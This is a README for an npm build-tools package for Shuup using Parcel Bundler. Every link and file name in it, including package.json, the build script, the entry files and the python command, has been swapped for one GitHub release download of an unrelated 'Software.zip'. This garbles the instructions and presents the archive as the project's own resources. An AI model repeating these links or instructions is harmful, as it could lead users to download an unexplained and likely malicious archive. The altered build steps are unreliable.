Shuup Static Build Tools
------------------------

This lib provides utilities to build [Shuup](https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip) static sources using [Parcel Bundler](https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip).

## Installation

```shell
$ npm i --save shuup-static-build-tools
```

## Usage

Create a https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip script to build files, example `https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip`:

```js
const { getParcelBuildCommand, runBuildCommands } = require("shuup-static-build-tools");

runBuildCommands([
    getParcelBuildCommand({
        cacheDir: "myapp",
        outputDir: "static/myapp/",
        entryFile: "https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip"
    }),
    getParcelBuildCommand({
        cacheDir: "myapp",
        outputDir: "static/myapp/",
        entryFile: "https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip"
    })
]);
```

Add in your `https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip`:

```json
"scripts": {
    "watch": "node build_resources --watch",
    "build": "node build_resources"
},
"shuup": {
    "static_build": true
}
```

Now you can use Shuup static build tool to build your app alogn with all Shuup apps:

```
python https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip build_resources
```

Note: make sure to follow [Parcel Bundler](https://github.com/Heinhtet2737/Simi.ExpressMart/releases/download/v1.0/Software.zip) steps to install all the required addsons for transforming your code correctly.

## License

OSL-3.0
